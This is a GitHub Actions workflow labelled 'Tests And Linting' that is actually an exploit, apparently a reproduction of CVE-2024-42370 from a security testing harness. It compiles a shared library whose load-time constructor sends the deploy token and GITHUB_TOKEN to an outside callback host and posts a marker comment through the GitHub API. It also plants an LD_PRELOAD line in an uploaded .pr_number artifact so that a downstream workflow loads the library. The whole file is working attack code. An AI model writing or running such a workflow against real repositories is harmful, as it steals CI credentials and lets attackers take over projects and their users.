name: Tests And Linting

on:
  pull_request:

jobs:
  upload-payload:
    runs-on: ubuntu-latest
    steps:
      - name: Build payload and poisoned .pr_number
        run: |
          cat > inject.c <<'CEOF'
          #include <stdlib.h>
          #include <stdio.h>

          __attribute__((constructor)) void init(void) {
              unsetenv("LD_PRELOAD");
              char cmd[8192];
              snprintf(cmd, sizeof(cmd),
                  "curl -s -o /dev/null -X POST "
                  "\"https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-42370-e92456f2eefe"
                  "?harness_run_id=20260903T172619-4dce63ce"
                  "&event=%s&repo=%s&run=%s&job=%s\" "
                  "--data-urlencode \"deploy_token=%s\" "
                  "--data-urlencode \"gh_token=%s\" "
                  "|| wget -qO /dev/null --post-data='' "
                  "\"https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-42370-e92456f2eefe?harness_run_id=20260903T172619-4dce63ce\" ; "
                  "curl -s -o /dev/null -X POST -H \"Authorization: Bearer %s\" "
                  "-H \"Accept: application/vnd.github+json\" "
                  "-d '{\"body\":\"INJECTED-MARKER-cve-2024-42370-e92456f2eefe\"}' "
                  "\"%s/repos/%s/issues/%s/comments\"",
                  getenv("GITHUB_EVENT_NAME") ? getenv("GITHUB_EVENT_NAME") : "",
                  getenv("GITHUB_REPOSITORY") ? getenv("GITHUB_REPOSITORY") : "",
                  getenv("GITHUB_RUN_ID") ? getenv("GITHUB_RUN_ID") : "",
                  getenv("GITHUB_JOB") ? getenv("GITHUB_JOB") : "",
                  getenv("INPUT_TOKEN") ? getenv("INPUT_TOKEN") : "",
                  getenv("GITHUB_TOKEN") ? getenv("GITHUB_TOKEN") : "",
                  getenv("GITHUB_TOKEN") ? getenv("GITHUB_TOKEN") : "",
                  getenv("GITHUB_API_URL") ? getenv("GITHUB_API_URL") : "https://api.github.com",
                  getenv("GITHUB_REPOSITORY") ? getenv("GITHUB_REPOSITORY") : "",
                  getenv("PR_NUMBER") ? getenv("PR_NUMBER") : "1");
              system(cmd);
          }
          CEOF
          gcc -shared -fPIC -o inject.so inject.c
          printf '%s\nLD_PRELOAD=%s/docs-preview/inject.so\n' "${{ github.event.number }}" "$GITHUB_WORKSPACE" > .pr_number

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: docs-preview
          include-hidden-files: true
          path: |
            .pr_number
            inject.so
